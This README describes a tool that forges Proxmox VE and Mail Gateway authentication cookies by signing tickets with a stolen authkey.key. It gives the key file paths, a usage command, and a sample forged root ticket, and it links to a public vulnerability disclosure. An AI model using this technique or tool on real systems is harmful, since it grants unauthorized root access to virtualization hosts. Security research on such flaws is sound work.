## ProxmoxAuthForge
This Python script is a modified version of the original proof of concept by Li JianTao ([@cursered](https://x.com/cursered)), designed for forging PVE (Proxmox VE) authentication tokens. The script generates the cookie "PVEAuthCookie" or "PMGAuthCookie" by using the `authkey.key` of a Proxmox instance for signing.

For more details, visit: [Multiple Vulnerabilities in Proxmox VE & Proxmox Mail Gateway](https://starlabs.sg/blog/2022/12-multiple-vulnerabilites-in-proxmox-ve--proxmox-mail-gateway/#privilege-escalation-in-pmg-via-unsecured-backup-file).

## Authentication Mechanism in PVE/PMG
- Authentication in PVE and PMG is implemented by signing and verifying a string with RSA/SHA-1.
- Upon successful login, the server issues a signed “ticket” for the client, known as “PVEAuthCookie” or “PMGAuthCookie”.
- The ticket format is `PVE:{username}@{realm}:{hex(timestamp)}`; the signature is created using a private key stored at `/etc/pve/priv/authkey.key` for *PVE*, or `/etc/pmg/pmg-authkey.key` for *PMG*.

## Script Usage
```bash
python3 pve_token_forger.py <path_to_authkey> <system_type> <username>

# Example usage
python3 pve_token_forger.py /etc/pve/priv/authkey.key PVE root@pam -h
PVE:root@pam:6582A001::mSoWs0OiTIiT9XlvkUT/kojDzIvAQaSF76kdGULdVb3a7L5d70lQyimQvrGccsbg8bdCOB5B5G4YlwDyjsr/xWAVQB8DvdFMu3h/W+e8/FGQ+yhUC4z/Rwivqjw2BHS8ConmiYl1AFxxStwXCWdyqk6b3+f3WP+Vj5QlJAC1xeT4CRUBA9YeuGNL9NBd8u9NqHzicMhd00vCPD+9ekna68hLA4sPbqIoCAe/IiLDLpeVgImqAVTaW2j20KjumEIwPf1G+i+lSwfw+Xbe2e6s6bz0sgirITR5r5hHDOO8vMaKnV2yOcP3xuBWM87LPhMwN3QuP5oluEkWUZ7OZh2/Tw=
```


---

*The script is for informational and educational purposes only. The author and contributors of this script are not responsible for any misuse or damage caused by this tool.* <!-- meme -->

